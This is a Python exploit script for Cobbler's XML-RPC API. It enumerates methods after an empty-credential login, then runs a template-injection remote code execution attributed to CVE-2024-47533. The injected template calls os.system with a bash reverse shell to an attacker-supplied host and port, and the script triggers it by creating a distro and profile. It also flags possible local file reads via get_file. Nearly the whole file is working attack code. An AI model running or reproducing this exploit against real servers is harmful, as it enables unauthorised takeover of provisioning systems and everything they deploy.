#!/usr/bin/env python3
"""
Cobbler XML-RPC Enumerator + Exploiter
- Enumerates available XML-RPC methods
- Maps to potential exploit paths
- Can automatically run CVE-2024-47533 template injection RCE
"""
##
import xmlrpc.client
import argparse
import uuid
import sys

METHODS_TO_TEST = [
    "background_build", "generate_profile_autoinstall", "get_distros", "get_file",
    "get_profiles", "get_settings", "get_signatures", "get_systems",
    "get_template_file_for_system", "login", "modify_distro", "modify_profile",
    "modify_system", "new_distro", "new_profile", "new_system", "remove_distro",
    "remove_profile", "remove_system", "rename_distro", "rename_profile", "rename_system",
    "save_distro", "save_profile", "save_system", "status_report", "sync",
    "write_autoinstall_template"
]

def test_method(server, method, token):
    try:
        func = getattr(server, method)
        # Try calling with minimal safe args
        if method.startswith("get_") or "list" in method or "generate" in method:
            func()
            return "OK"
        elif method.startswith("new_"):
            func(token)
            return "OK"
        elif method.startswith("save_") or method.startswith("modify_") or method.startswith("rename_"):
            func(0, "", "", token)
            return "OK Fault"
        elif method.startswith("remove_"):
            func("", token)
            return "OK"
        elif method == "login":
            return "SKIP"
        elif method == "write_autoinstall_template":
            func("test.ks", "# dummy", token)
            return "OK"
        else:
            func(token)
            return "OK"
    except xmlrpc.client.Fault as f:
        return f"OK Fault: {f}"
    except Exception:
        return "NO"

def build_payload(lhost, lport):
    return f"""#set $null = __import__('os').system('bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"')
lang en_US
keyboard us
network --bootproto=dhcp
rootpw  --plaintext cobbler
timezone UTC
bootloader --location=mbr
clearpart --all --initlabel
autopart
reboot
"""

def run_rce(server, token, lhost, lport):
    print("[*] Running CVE-2024-47533 RCE...")
    ks_name = "pwn.ks"
    payload = build_payload(lhost, lport)
    server.write_autoinstall_template(ks_name, payload, token)

    suffix = str(uuid.uuid4())[:4]
    distro_name = f"pwn_distro{suffix}"
    profile_name = "pwnprof"

    did = server.new_distro(token)
    server.modify_distro(did, "name", distro_name, token)
    server.modify_distro(did, "arch", "x86_64", token)
    server.modify_distro(did, "breed", "redhat", token)
    server.modify_distro(did, "kernel", "vmlinuz", token)
    server.modify_distro(did, "initrd", "initrd.img", token)
    server.save_distro(did, token)

    try:
        pid = server.new_profile(token)
        server.modify_profile(pid, "name", profile_name, token)
    except xmlrpc.client.Fault:
        pid = server.get_profile(profile_name, token)

    server.modify_profile(pid, "distro", distro_name, token)
    server.modify_profile(pid, "autoinstall", ks_name, token)
    server.modify_profile(pid, "kickstart", ks_name, token)
    server.save_profile(pid, token)

    print("[+] Triggering payload...")
    server.generate_profile_autoinstall(profile_name)

def main():
    parser = argparse.ArgumentParser(description="Cobbler XML-RPC Enumerator + Exploiter")
    parser.add_argument("target", help="Target URL (e.g. http://127.0.0.1:25151)")
    parser.add_argument("--lhost", help="Local host for reverse shell")
    parser.add_argument("--lport", help="Local port for reverse shell")
    args = parser.parse_args()

    target_url = args.target.rstrip("/") + "/RPC2"
    print(f"[+] Connecting to {target_url}")
    server = xmlrpc.client.ServerProxy(target_url)

    try:
        token = server.login("", -1)
        print(f"[+] Authenticated: token={token}")
    except Exception as e:
        print(f"[!] Authentication failed: {e}")
        sys.exit(1)

    print("[*] Discovering methods...")
    capabilities = {}
    for method in METHODS_TO_TEST:
        status = test_method(server, method, token)
        print(f"  {method:<30} {status}")
        capabilities[method] = status

    print("\n=== Exploitation Suggestions ===")
    if (capabilities.get("write_autoinstall_template", "").startswith("OK")
        and capabilities.get("generate_profile_autoinstall", "").startswith("OK")):
        print(" - RCE possible via template injection (CVE-2024-47533)")
        if args.lhost and args.lport:
            run_rce(server, token, args.lhost, args.lport)

    if capabilities.get("get_file", "").startswith("OK"):
        print(" - Possible LFI via get_file()")

if __name__ == "__main__":
    main()
##
